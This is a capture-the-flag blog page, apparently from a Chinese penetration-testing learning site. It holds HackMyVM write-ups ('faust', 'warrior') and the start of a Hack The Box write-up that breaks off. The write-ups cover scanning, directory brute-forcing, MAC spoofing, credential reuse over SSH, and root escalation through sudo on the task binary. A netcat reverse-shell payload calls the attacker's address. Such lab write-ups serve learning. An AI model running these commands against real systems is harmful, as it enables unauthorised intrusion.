<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">nico@debian:/tmp<span class="variable">$</span> <span class="built_in">echo</span> <span class="string">&quot;nc -e /bin/bash 192.168.56.127 8888&quot;</span> &gt;goodgame</span><br><span class="line">nico@debian:/tmp<span class="variable">$</span> chmod +x goodgame</span><br><span class="line">nico@debian:/tmp<span class="variable">$</span> <span class="built_in">ls</span></span><br><span class="line">goodgame</span><br><span class="line">systemd<span class="literal">-private-ad04a55cc7794aecabcc0313ed54c41b-apache2</span>.service<span class="literal">-T943wT</span></span><br><span class="line">systemd<span class="literal">-private-ad04a55cc7794aecabcc0313ed54c41b-systemd-timesyncd</span>.service<span class="literal">-7nEvtU</span></span><br><span class="line">nico@debian:/tmp<span class="variable">$</span> <span class="built_in">ls</span> <span class="literal">-al</span></span><br><span class="line">total <span class="number">40</span></span><br><span class="line">drwxrwxrwt  <span class="number">9</span> root root <span class="number">4096</span> juil. <span class="number">30</span> <span class="number">13</span>:<span class="number">24</span> .</span><br><span class="line">drwxr<span class="literal">-xr-x</span> <span class="number">19</span> root root <span class="number">4096</span> avril  <span class="number">1</span>  <span class="number">2021</span> ..</span><br><span class="line">drwxrwxrwt  <span class="number">2</span> root root <span class="number">4096</span> juil. <span class="number">30</span> <span class="number">10</span>:<span class="number">05</span> .font<span class="literal">-unix</span></span><br><span class="line"><span class="literal">-rwxr-xr-x</span>  <span class="number">1</span> nico nico   <span class="number">36</span> juil. <span class="number">30</span> <span class="number">13</span>:<span class="number">24</span> goodgame</span><br><span class="line">drwxrwxrwt  <span class="number">2</span> root root <span class="number">4096</span> juil. <span class="number">30</span> <span class="number">10</span>:<span class="number">05</span> .ICE<span class="literal">-unix</span></span><br><span class="line">drwx<span class="literal">------</span>  <span class="number">3</span> root root <span class="number">4096</span> juil. <span class="number">30</span> <span class="number">10</span>:<span class="number">05</span> systemd<span class="literal">-private-ad04a55cc7794aecabcc0313ed54c41b-apache2</span>.service<span class="literal">-T943wT</span></span><br><span class="line">drwx<span class="literal">------</span>  <span class="number">3</span> root root <span class="number">4096</span> juil. <span class="number">30</span> <span class="number">10</span>:<span class="number">05</span> systemd<span class="literal">-private-ad04a55cc7794aecabcc0313ed54c41b-systemd-timesyncd</span>.service<span class="literal">-7nEvtU</span></span><br><span class="line">drwxrwxrwt  <span class="number">2</span> root root <span class="number">4096</span> juil. <span class="number">30</span> <span class="number">10</span>:<span class="number">05</span> .<span class="built_in">Test-unix</span></span><br><span class="line">drwxrwxrwt  <span class="number">2</span> root root <span class="number">4096</span> juil. <span class="number">30</span> <span class="number">10</span>:<span class="number">05</span> .X11<span class="literal">-unix</span></span><br><span class="line">drwxrwxrwt  <span class="number">2</span> root root <span class="number">4096</span> juil. <span class="number">30</span> <span class="number">10</span>:<span class="number">05</span> .XIM<span class="literal">-unix</span></span><br><span class="line">nico@debian:/tmp<span class="variable">$</span> <span class="built_in">cat</span> goodgame</span><br><span class="line">nc <span class="literal">-e</span> /bin/bash <span class="number">192.168</span>.<span class="number">56.127</span> <span class="number">8888</span></span><br><span class="line">nico@debian:/tmp<span class="variable">$</span> </span><br></pre></td></tr></table></figure>

<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">┌──(root㉿kali)-[/<span class="type">home</span>/<span class="type">ace</span>]</span><br><span class="line">└─<span class="comment"># nc -lvnp 8888                   </span></span><br><span class="line">listening on [<span class="type">any</span>] <span class="number">8888</span> ...</span><br><span class="line">connect to <span class="function">[<span class="number">192.168</span><span class="type">.56.127</span>] <span class="title">from</span></span> (UNKNOWN) [<span class="number">192.168</span><span class="type">.56.138</span>] <span class="number">54748</span></span><br><span class="line"><span class="built_in">ls</span></span><br><span class="line">root.txt</span><br><span class="line"><span class="built_in">cat</span> root.txt</span><br><span class="line">lasarnsilgam                     </span><br></pre></td></tr></table></figure>


      
    </div>
    <footer class="article-footer">
      <a data-url="http://example.com/2023/07/30/faust/" data-id="clmnr8k070008so8g6389h0sv" data-title="faust" class="article-share-link"><span class="fa fa-share">Share</span></a>
      
      
      
  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/hackmyvm/" rel="tag">hackmyvm</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/msf/" rel="tag">msf</a></li></ul>

    </footer>
  </div>
  
</article>



  
    <article id="post-warrior" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  <div class="article-meta">
    <a href="/2023/07/29/warrior/" class="article-date">
  <time class="dt-published" datetime="2023-07-29T03:29:28.000Z" itemprop="datePublished">2023-07-29</time>
</a>
    
  <div class="article-category">
    <a class="article-category-link" href="/categories/%E6%B8%97%E9%80%8F%E5%AD%A6%E4%B9%A0/">渗透学习</a>
  </div>

  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="p-name article-title" href="/2023/07/29/warrior/">warrior</a>
    </h1>
  

      </header>
    
    <div class="e-content article-entry" itemprop="articleBody">
      
        <h2 id="1-扫描端口服务"><a href="#1-扫描端口服务" class="headerlink" title="1.扫描端口服务"></a>1.扫描端口服务</h2><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">┌──(root㉿kali)-[/<span class="type">home</span>/<span class="type">ace</span>]</span><br><span class="line">└─<span class="comment"># nmap -sC -sV -p- 192.168.56.137</span></span><br><span class="line">Starting Nmap <span class="number">7.93</span> ( https://nmap.org ) at <span class="number">2023</span><span class="literal">-07-29</span> <span class="number">11</span>:<span class="number">38</span> CST</span><br><span class="line">Nmap scan report <span class="keyword">for</span> <span class="number">192.168</span>.<span class="number">56.137</span></span><br><span class="line">Host is up (<span class="number">0.0012</span>s latency).</span><br><span class="line">Not shown: <span class="number">65533</span> closed tcp ports (reset)</span><br><span class="line">PORT   STATE SERVICE VERSION</span><br><span class="line"><span class="number">22</span>/tcp open  ssh     OpenSSH <span class="number">8.4</span>p1 Debian <span class="number">5</span> (protocol <span class="number">2.0</span>)</span><br><span class="line">| ssh<span class="literal">-hostkey</span>: </span><br><span class="line">|   <span class="number">3072</span> <span class="number">25168</span>d636b75f05955d4b02d758de0e6 (RSA)</span><br><span class="line">|   <span class="number">256</span> <span class="number">1</span>e29d0f4c595e740302b35f7a3bc3675 (ECDSA)</span><br><span class="line">|_  <span class="number">256</span> ccb152b3d7efcd734cfcf6b55177eaf3 (ED25519)</span><br><span class="line"><span class="number">80</span>/tcp open  http    nginx <span class="number">1.18</span>.<span class="number">0</span></span><br><span class="line">| http<span class="literal">-robots</span>.txt: <span class="number">7</span> disallowed entries </span><br><span class="line">| /admin /secret.txt /uploads/id_rsa /internal.php </span><br><span class="line">|_/internal /cms /user.txt</span><br><span class="line">|_http<span class="literal">-title</span>: Site doesn<span class="string">&#x27;t have a title (text/html).</span></span><br><span class="line"><span class="string">|_http-server-header: nginx/1.18.0</span></span><br><span class="line"><span class="string">MAC Address: 08:00:27:17:EB:28 (Oracle VirtualBox virtual NIC)</span></span><br><span class="line"><span class="string">Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span></span><br><span class="line"><span class="string">Nmap done: 1 IP address (1 host up) scanned in 14.30 seconds</span></span><br></pre></td></tr></table></figure>

<h2 id="2-访问网页"><a href="#2-访问网页" class="headerlink" title="2.访问网页"></a>2.访问网页</h2><p><img src="/../pic/image-20230729114152533.png" alt="image-20230729114152533"></p>
<p>没啥意义</p>
<h2 id="3-gobuster扫一下目录"><a href="#3-gobuster扫一下目录" class="headerlink" title="3.gobuster扫一下目录"></a>3.gobuster扫一下目录</h2><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">┌──(root㉿kali)-[/<span class="type">home</span>/<span class="type">ace</span>]</span><br><span class="line">└─<span class="comment"># gobuster dir -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -u http://192.168.56.137/ -x php,txt,html</span></span><br><span class="line">===============================================================</span><br><span class="line">Gobuster v3.<span class="number">5</span></span><br><span class="line">by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@firefart)</span><br><span class="line">===============================================================</span><br><span class="line">[+] Url:                     http://<span class="number">192.168</span>.<span class="number">56.137</span>/</span><br><span class="line">[+] Method:                  GET</span><br><span class="line">[+] Threads:                 <span class="number">10</span></span><br><span class="line">[+] Wordlist:                /usr/share/seclists/Discovery/Web<span class="literal">-Content</span>/directory<span class="literal">-list-2</span>.<span class="number">3</span><span class="literal">-medium</span>.txt</span><br><span class="line">[+] Negative Status codes:   <span class="number">404</span></span><br><span class="line">[+] User Agent:              gobuster/<span class="number">3.5</span></span><br><span class="line">[+] Extensions:              php,txt,html</span><br><span class="line">[+] Timeout:                 <span class="number">10</span>s</span><br><span class="line">===============================================================</span><br><span class="line"><span class="number">2023</span>/<span class="number">07</span>/<span class="number">29</span> <span class="number">11</span>:<span class="number">42</span>:<span class="number">25</span> Starting gobuster <span class="keyword">in</span> directory enumeration mode</span><br><span class="line">===============================================================</span><br><span class="line">/index.html           (Status: <span class="number">200</span>) [<span class="type">Size</span>: <span class="number">31</span>]</span><br><span class="line">/user.txt             (Status: <span class="number">200</span>) [<span class="type">Size</span>: <span class="number">5</span>]</span><br><span class="line">/admin                (Status: <span class="number">301</span>) [<span class="type">Size</span>: <span class="number">169</span>] [--&gt; <span class="type">http</span>://<span class="number">192.168</span><span class="type">.56.137</span>/<span class="type">admin</span>/]</span><br><span class="line">/robots.txt           (Status: <span class="number">200</span>) [<span class="type">Size</span>: <span class="number">137</span>]</span><br><span class="line">/internal.php         (Status: <span class="number">200</span>) [<span class="type">Size</span>: <span class="number">82</span>]</span><br><span class="line">/secret.txt           (Status: <span class="number">200</span>) [<span class="type">Size</span>: <span class="number">17</span>]</span><br><span class="line">Progress: <span class="number">450467</span> / <span class="number">882244</span> (<span class="number">51.06</span>%)^C</span><br><span class="line">[!] Keyboard interrupt detected, terminating.</span><br><span class="line"></span><br><span class="line">===============================================================</span><br><span class="line"><span class="number">2023</span>/<span class="number">07</span>/<span class="number">29</span> <span class="number">11</span>:<span class="number">47</span>:<span class="number">20</span> Finished</span><br><span class="line">===============================================================</span><br></pre></td></tr></table></figure>

<p>访问一下</p>
<p><img src="/../pic/image-20230729115029256.png" alt="image-20230729115029256"></p>
<p><img src="/../pic/image-20230729115116219.png" alt="image-20230729115116219"></p>
<p><img src="/../pic/image-20230729115144331.png" alt="image-20230729115144331"></p>
<p><img src="/../pic/image-20230729115545738.png" alt="image-20230729115545738"></p>
<h2 id="4-更改mac"><a href="#4-更改mac" class="headerlink" title="4.更改mac"></a>4.更改mac</h2><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line">┌──(root㉿kali)-[/<span class="type">home</span>/<span class="type">ace</span>]</span><br><span class="line">└─<span class="comment"># ifconfig eth1 down</span></span><br><span class="line">                                                                                                                                                  </span><br><span class="line">┌──(root㉿kali)-[/<span class="type">home</span>/<span class="type">ace</span>]</span><br><span class="line">└─<span class="comment"># ifconfig eth1 hw ether 00:00:00:00:00:AF</span></span><br><span class="line">                                                                                                                                                  </span><br><span class="line">┌──(root㉿kali)-[/<span class="type">home</span>/<span class="type">ace</span>]</span><br><span class="line">└─<span class="comment"># ifconfig eth1 up                        </span></span><br><span class="line">                                                                                                                                                  </span><br><span class="line">┌──(root㉿kali)-[/<span class="type">home</span>/<span class="type">ace</span>]</span><br><span class="line">└─<span class="comment"># ifconfig        </span></span><br><span class="line">eth0: flags=<span class="number">4163</span>&lt;UP,BROADCAST,RUNNING,MULTICAST&gt;  mtu <span class="number">1500</span></span><br><span class="line">        inet <span class="number">192.168</span>.<span class="number">181.139</span>  netmask <span class="number">255.255</span>.<span class="number">255.0</span>  broadcast <span class="number">192.168</span>.<span class="number">181.255</span></span><br><span class="line">        inet6 fe80::<span class="number">20</span>c:<span class="number">29</span>ff:fe4d:<span class="number">2</span>f0b  prefixlen <span class="number">64</span>  scopeid <span class="number">0</span>x20&lt;link&gt;</span><br><span class="line">        ether <span class="number">00</span>:<span class="number">0</span>c:<span class="number">29</span>:<span class="number">4</span>d:<span class="number">2</span>f:<span class="number">0</span>b  txqueuelen <span class="number">1000</span>  (Ethernet)</span><br><span class="line">        RX packets <span class="number">45603</span>  bytes <span class="number">6896380</span> (<span class="number">6.5</span> MiB)</span><br><span class="line">        RX errors <span class="number">0</span>  dropped <span class="number">0</span>  overruns <span class="number">0</span>  frame <span class="number">0</span></span><br><span class="line">        TX packets <span class="number">43194</span>  bytes <span class="number">2636881</span> (<span class="number">2.5</span> MiB)</span><br><span class="line">        TX errors <span class="number">0</span>  dropped <span class="number">0</span> overruns <span class="number">0</span>  carrier <span class="number">0</span>  collisions <span class="number">0</span></span><br><span class="line"></span><br><span class="line">eth1: flags=<span class="number">4163</span>&lt;UP,BROADCAST,RUNNING,MULTICAST&gt;  mtu <span class="number">1500</span></span><br><span class="line">        inet <span class="number">192.168</span>.<span class="number">56.127</span>  netmask <span class="number">255.255</span>.<span class="number">255.0</span>  broadcast <span class="number">192.168</span>.<span class="number">56.255</span></span><br><span class="line">        inet6 fe80::<span class="number">200</span>:ff:fe00:af  prefixlen <span class="number">64</span>  scopeid <span class="number">0</span>x20&lt;link&gt;</span><br><span class="line">        ether <span class="number">00</span>:<span class="number">00</span>:<span class="number">00</span>:<span class="number">00</span>:<span class="number">00</span>:af  txqueuelen <span class="number">1000</span>  (Ethernet)</span><br><span class="line">        RX packets <span class="number">561753</span>  bytes <span class="number">176917710</span> (<span class="number">168.7</span> MiB)</span><br><span class="line">        RX errors <span class="number">0</span>  dropped <span class="number">0</span>  overruns <span class="number">0</span>  frame <span class="number">0</span></span><br><span class="line">        TX packets <span class="number">549265</span>  bytes <span class="number">80914874</span> (<span class="number">77.1</span> MiB)</span><br><span class="line">        TX errors <span class="number">0</span>  dropped <span class="number">0</span> overruns <span class="number">0</span>  carrier <span class="number">0</span>  collisions <span class="number">0</span></span><br><span class="line"></span><br><span class="line">lo: flags=<span class="number">73</span>&lt;UP,LOOPBACK,RUNNING&gt;  mtu <span class="number">65536</span></span><br><span class="line">        inet <span class="number">127.0</span>.<span class="number">0.1</span>  netmask <span class="number">255.0</span>.<span class="number">0.0</span></span><br><span class="line">        inet6 ::<span class="number">1</span>  prefixlen <span class="number">128</span>  scopeid <span class="number">0</span>x10&lt;host&gt;</span><br><span class="line">        loop  txqueuelen <span class="number">1000</span>  (Local Loopback)</span><br><span class="line">        RX packets <span class="number">4</span>  bytes <span class="number">240</span> (<span class="number">240.0</span> B)</span><br><span class="line">        RX errors <span class="number">0</span>  dropped <span class="number">0</span>  overruns <span class="number">0</span>  frame <span class="number">0</span></span><br><span class="line">        TX packets <span class="number">4</span>  bytes <span class="number">240</span> (<span class="number">240.0</span> B)</span><br><span class="line">        TX errors <span class="number">0</span>  dropped <span class="number">0</span> overruns <span class="number">0</span>  carrier <span class="number">0</span>  collisions <span class="number">0</span></span><br></pre></td></tr></table></figure>

<p>再度访问网页：</p>
<p><img src="/../pic/image-20230729115904388.png" alt="image-20230729115904388"></p>
<p>账号：bro 密码：  Zurviv0r1 </p>
<h2 id="5-ssh连接"><a href="#5-ssh连接" class="headerlink" title="5.ssh连接"></a>5.ssh连接</h2><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">┌──(root㉿kali)-[/<span class="type">home</span>/<span class="type">ace</span>]</span><br><span class="line">└─<span class="comment"># ssh bro@192.168.56.137   </span></span><br><span class="line">The authenticity of host <span class="string">&#x27;192.168.56.137 (192.168.56.137)&#x27;</span> can<span class="string">&#x27;t be established.</span></span><br><span class="line"><span class="string">ED25519 key fingerprint is SHA256:LKGaz7vcAZo/hWtEM4N2MzrC3C6Gl5sNO4+P8d7TpV8.</span></span><br><span class="line"><span class="string">This key is not known by any other names.</span></span><br><span class="line"><span class="string">Are you sure you want to continue connecting (yes/no/[fingerprint])? yes</span></span><br><span class="line"><span class="string">Warning: Permanently added &#x27;</span><span class="number">192.168</span>.<span class="number">56.137</span><span class="string">&#x27; (ED25519) to the list of known hosts.</span></span><br><span class="line"><span class="string">Load key &quot;/root/.ssh/id_rsa&quot;: error in libcrypto</span></span><br><span class="line"><span class="string">bro@192.168.56.137&#x27;</span>s password: </span><br><span class="line">Linux warrior <span class="number">5.10</span>.<span class="number">0</span><span class="literal">-11-amd64</span> <span class="comment">#1 SMP Debian 5.10.92-1 (2022-01-18) x86_64</span></span><br><span class="line"></span><br><span class="line">The programs included with the Debian GNU/Linux system are free software;</span><br><span class="line">the exact distribution terms <span class="keyword">for</span> each program are described <span class="keyword">in</span> the</span><br><span class="line">individual files <span class="keyword">in</span> /usr/share/doc/*/copyright.</span><br><span class="line"></span><br><span class="line">Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent</span><br><span class="line">permitted by applicable law.</span><br><span class="line">Last login: Tue Feb  <span class="number">8</span> <span class="number">04</span>:<span class="number">03</span>:<span class="number">20</span> <span class="number">2022</span> from <span class="number">192.168</span>.<span class="number">1.51</span></span><br><span class="line">bro@warrior:~<span class="variable">$</span> <span class="built_in">ls</span></span><br><span class="line">user.txt</span><br><span class="line">bro@warrior:~<span class="variable">$</span> <span class="built_in">cat</span> user.txt</span><br><span class="line">LcHHbXGHMVhCpQHvqDen</span><br><span class="line">bro@warrior:~<span class="variable">$</span> </span><br></pre></td></tr></table></figure>

<h2 id="6-漏洞提权"><a href="#6-漏洞提权" class="headerlink" title="6.漏洞提权"></a>6.漏洞提权</h2><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">bro@warrior:~<span class="variable">$</span> sudo <span class="literal">-l</span></span><br><span class="line"><span class="literal">-bash</span>: sudo: command not found</span><br><span class="line">bro@warrior:~<span class="variable">$</span> find / <span class="literal">-user</span> root <span class="literal">-perm</span> <span class="literal">-4000</span> <span class="literal">-print</span> <span class="number">2</span>&gt;/dev/null</span><br><span class="line">/usr/sbin/sudo</span><br><span class="line">/usr/bin/umount</span><br><span class="line">/usr/bin/chsh</span><br><span class="line">/usr/bin/su</span><br><span class="line">/usr/bin/newgrp</span><br><span class="line">/usr/bin/<span class="built_in">mount</span></span><br><span class="line">/usr/bin/gpasswd</span><br><span class="line">/usr/bin/passwd</span><br><span class="line">/usr/bin/chfn</span><br><span class="line">/usr/lib/dbus<span class="literal">-1</span>.<span class="number">0</span>/dbus<span class="literal">-daemon-launch-helper</span></span><br><span class="line">/usr/lib/openssh/ssh<span class="literal">-keysign</span></span><br><span class="line">bro@warrior:~<span class="variable">$</span> </span><br></pre></td></tr></table></figure>

<p>&#x2F;usr&#x2F;sbin&#x2F;sudo可以尝试</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">bro@warrior:/<span class="variable">$</span> /usr/sbin/sudo <span class="literal">-l</span></span><br><span class="line">Matching Defaults entries <span class="keyword">for</span> bro on warrior:</span><br><span class="line">    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin</span><br><span class="line"></span><br><span class="line">User bro may run the following commands on warrior:</span><br><span class="line">    (root) NOPASSWD: /usr/bin/task</span><br></pre></td></tr></table></figure>

<p>目标瞄准task:</p>
<p>task可以直接利用</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">bro@warrior:/<span class="variable">$</span> /usr/sbin/sudo task execute /bin/bash</span><br><span class="line">root@warrior:/<span class="comment"># cat root.txt</span></span><br><span class="line"><span class="built_in">cat</span>: root.txt: No such file or directory</span><br><span class="line">root@warrior:/<span class="comment"># ls</span></span><br><span class="line">bin   dev  home        initrd.img.old  lib32  libx32      media  opt   root  sbin  sys  usr  vmlinuz</span><br><span class="line">boot  etc  initrd.img  lib             lib64  lost+found  mnt    proc  run   srv   tmp  var  vmlinuz.old</span><br><span class="line">root@warrior:/<span class="comment"># cd root</span></span><br><span class="line">root@warrior:~<span class="comment"># ls</span></span><br><span class="line">root.txt</span><br><span class="line">root@warrior:~<span class="comment"># cat root.txt</span></span><br><span class="line">HPiGHMVcDNLlXbHLydMv</span><br><span class="line">root@warrior:~<span class="comment"># </span></span><br></pre></td></tr></table></figure>

<p>over!!!</p>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://example.com/2023/07/29/warrior/" data-id="clmnr8k0r002oso8ggw5fh0i9" data-title="warrior" class="article-share-link"><span class="fa fa-share">Share</span></a>
      
      
      
  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/fuzz/" rel="tag">fuzz</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/hackmyvm/" rel="tag">hackmyvm</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/%E7%9B%AE%E5%BD%95%E6%B8%97%E9%80%8F/" rel="tag">目录渗透</a></li></ul>

    </footer>
  </div>
  
</article>



  
    <article id="post-htb-1" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  <div class="article-meta">
    <a href="/2023/07/28/htb-1/" class="article-date">
  <time class="dt-published" datetime="2023-07-28T13:31:39.000Z" itemprop="datePublished">2023-07-28</time>
</a>
    
  <div class="article-category">
    <a class="article-category-link" href="/categories/hack-the-box/">hack the box</a>
  </div>

  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="p-name article-title" href="/2023/07/28/htb-1/">htb_1</a>
    </h1>
  

      </header>
    
    <div class="e-content article-entry" itemprop="articleBody">
      
        <h1 id="hack-the-box"><a href="#hack-the-box" class="headerlink" title="hack the box"></a>hack the box</h1><h2 id="1-nmap扫描"><a href="#1-nmap扫描" class="headerlink" title="1.nmap扫描"></a>1.nmap扫描</h2><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">┌──(root㉿kali)-[/<span class="type">home</span>/<span class="type">ace</span>]</span><br><span class="line">└─<span class="comment"># nmap -v 10.129.1.17      </span></span><br><span class="line">Starting Nmap <span class="number">7.93</span> ( https://nmap.org ) at <span class="number">2023</span><span class="literal">-07-28</span> <span class="number">21</span>:<span class="number">33</span> CST</span><br><span class="line">Initiating Ping Scan at <span class="number">21</span>:<span class="number">33</span></span><br><span class="line">Scanning <span class="number">10.129</span>.<span class="number">1.17</span> [<span class="number">4</span> <span class="type">ports</span>]</span><br><span class="line">Completed Ping Scan at <span class="number">21</span>:<span class="number">33</span>, <span class="number">0.32</span>s elapsed (<span class="number">1</span> total hosts)</span><br><span class="line">Initiating Parallel DNS resolution of <span class="number">1</span> host. at <span class="number">21</span>:<span class="number">33</span></span><br><span class="line">Completed Parallel DNS resolution of <span class="number">1</span> host. at <span class="number">21</span>:<span class="number">33</span>, <span class="number">0.01</span>s elapsed</span><br><span class="line">Initiating SYN Stealth Scan at <span class="number">21</span>:<span class="number">33</span></span><br><span class="line">Scanning <span class="number">10.129</span>.<span class="number">1.17</span> [<span class="number">1000</span> <span class="type">ports</span>]</span><br><span class="line">Discovered open port <span class="number">23</span>/tcp on <span class="number">10.129</span>.<span class="number">1.17</span></span><br><span class="line">Completed SYN Stealth Scan at <span class="number">21</span>:<span class="number">34</span>, <span class="number">14.44</span>s elapsed (<span class="number">1000</span> total ports)</span><br><span class="line">Nmap scan report <span class="keyword">for</span> <span class="number">10.129</span>.<span class="number">1.17</span></span><br><span class="line">Host is up (<span class="number">0.29</span>s latency).</span><br><span class="line">Not shown: <span class="number">999</span> closed tcp ports (reset)</span><br><span class="line">PORT   STATE SERVICE</span><br><span class="line"><span class="number">23</span>/tcp open  telnet</span><br><span class="line"></span><br><span class="line">Read <span class="keyword">data</span> files from: /usr/bin/../share/nmap</span><br><span class="line">Nmap done: <span class="number">1</span> IP address (<span class="number">1</span> host up) scanned <span class="keyword">in</span> <span class="number">14.88</span> seconds</span><br><span class="line">           Raw packets sent: <span class="number">1264</span> (<span class="number">55.592</span>KB) | Rcvd: <span class="number">1050</span> (<span class="number">42.004</span>KB)</span><br></pre></td></tr></table></figure>

<p>可以注意到，23&#x2F;tcp 端口是开放的，服务是远程登录的。</p>
<h2 id="2-talnet连接"><a href="#2-talnet连接" class="headerlink" title="2.talnet连接"></a>2.talnet连接</h2><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span 